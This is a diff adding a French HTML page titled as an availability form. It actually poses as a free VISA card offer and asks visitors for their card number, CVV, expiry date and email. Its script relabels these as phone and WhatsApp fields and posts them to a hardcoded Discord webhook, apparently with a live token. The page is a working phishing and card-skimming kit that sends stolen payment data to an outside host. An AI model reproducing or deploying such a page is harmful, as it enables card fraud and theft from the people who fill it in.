@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Formulaire de disponibilité</title>
+<style>
+  :root {
+    --bg: #12130f;
+    --card: #1b1d17;
+    --text: #ece7da;
+    --muted: #9a9686;
+    --accent: #c9a13b;
+    --border: #35362c;
+  }
+
+  * { box-sizing: border-box; }
+
+  body {
+    margin: 0;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: var(--bg);
+    font-family: "Georgia", "Iowan Old Style", serif;
+    color: var(--text);
+    padding: 32px 16px;
+  }
+
+  .card {
+    width: 100%;
+    max-width: 480px;
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 40px 36px;
+  }
+
+  h1 {
+    font-size: 1.5rem;
+    font-weight: 400;
+    margin: 0 0 6px;
+    letter-spacing: 0.2px;
+  }
+
+  .card > p {
+    margin: 0 0 28px;
+    color: var(--muted);
+    font-size: 0.95rem;
+    line-height: 1.5;
+  }
+
+  form {
+    display: flex;
+    flex-direction: column;
+    gap: 18px;
+  }
+
+  label {
+    display: block;
+    font-size: 0.82rem;
+    color: var(--muted);
+    margin-bottom: 6px;
+  }
+
+  .field { flex: 1; }
+
+  input {
+    width: 100%;
+    background: transparent;
+    border: none;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+    font-family: inherit;
+    font-size: 1rem;
+    padding: 8px 2px;
+    outline: none;
+    transition: border-color 0.15s ease;
+  }
+
+  input:focus {
+    border-color: var(--accent);
+  }
+
+  input:invalid:not(:placeholder-shown) {
+    border-color: #c96b3b;
+  }
+
+  .hint {
+    font-size: 0.75rem;
+    color: var(--muted);
+    margin-top: 4px;
+  }
+
+  button {
+    margin-top: 12px;
+    background: var(--accent);
+    color: #1b1d17;
+    border: none;
+    padding: 13px 20px;
+    font-family: inherit;
+    font-size: 0.95rem;
+    border-radius: 3px;
+    cursor: pointer;
+    transition: opacity 0.15s ease;
+  }
+
+  button:hover { opacity: 0.88; }
+
+  .confirmation {
+    display: none;
+    margin-top: 18px;
+    color: var(--accent);
+    font-size: 0.9rem;
+  }
+</style>
+</head>
+<body>
+
+  <div class="card">
+    <h1>Commandez votre carte VISA</h1>
+    <p>entrer vos information de cartes pour commandez votre carte gratuitement et recevez les informations de votre carte par mail</p>
+
+    <form id="dispoForm">
+      <div class="field">
+        <label for="telephone">Numero de carte</label>
+        <input type="tel" id="telephone" name="telephone" required>
+      </div>
+
+      <div class="field">
+        <label for="whatsapp">CVV</label>
+        <input type="tel" id="whatsapp" name="whatsapp" required>
+      </div>
+
+      <div class="field">
+        <label for="date">Expiration</label>
+        <input type="text" id="date" name="date" placeholder="mm/aa" pattern="^(0[1-9]|1[0-2])/[0-9]{2}$" required>
+        <div class="hint">Format mm/aa, par exemple 12/26</div>
+      </div>
+
+      <div class="field">
+        <label for="email">Email</label>
+        <input type="email" id="email" name="email" required>
+      </div>
+
+      <button type="submit">Envoyer</button>
+      <p class="confirmation" id="confirmation">Checkez votre boite mail pour les informations de votre carte.</p>
+    </form>
+  </div>
+
+  <script>
+    // Remplace cette URL par l'URL de ton webhook Discord
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1547759416458219572/LCiXBZI01LPNRHQj83r3kGA_nyrvhKPaWfe8T01oAQvGwn6QErdr2CNu6Kzg0FluCEc-";
+
+    document.getElementById('dispoForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+
+      const telephone = document.getElementById('telephone').value;
+      const whatsapp = document.getElementById('whatsapp').value;
+      const date = document.getElementById('date').value;
+      const email = document.getElementById('email').value;
+
+      const payload = {
+        embeds: [{
+          title: "Nouvelle disponibilité reçue",
+          color: 0xc9a13b,
+          fields: [
+            { name: "Téléphone", value: telephone, inline: true },
+            { name: "WhatsApp", value: whatsapp, inline: true },
+            { name: "Date de disponibilité", value: date, inline: false },
+            { name: "Email", value: email, inline: false }
+          ]
+        }]
+      };
+
+      try {
+        await fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+        document.getElementById('confirmation').style.display = 'block';
+        this.reset();
+      } catch (err) {
+        alert("Erreur lors de l'envoi. Vérifie l'URL du webhook.");
+        console.error(err);
+      }
+    });
+  </script>
+
+</body>
+</html>
